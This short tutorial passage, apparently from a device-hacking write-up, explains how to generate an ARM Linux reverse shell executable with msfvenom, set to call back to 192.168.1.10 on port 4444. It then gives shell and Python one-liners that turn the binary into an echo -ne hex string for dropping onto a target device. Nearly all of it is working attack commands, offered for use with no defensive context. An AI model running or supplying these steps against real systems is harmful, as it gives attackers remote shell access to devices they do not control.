## Reverse Shell
You can use msfvenom to generate a lightweight reverse shell binary executable. You can modify the parameters according to the kernel environment you are working with. In my case, it's armv7l, and the command is as follows:

`msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o pwn.elf`

## Preliminary steps
Convert the generated binary file into binary data.
```
$ for i in `cat pwn.elf | xxd -p`;do echo -n $i;done

$ python3 -c 'a=input("binary data:");print("echo -ne \"",end="");print(*[f"\\x{a[i:i+2]}" for i in range(0,len(a),2)],sep="",end="");print("\"")'
```
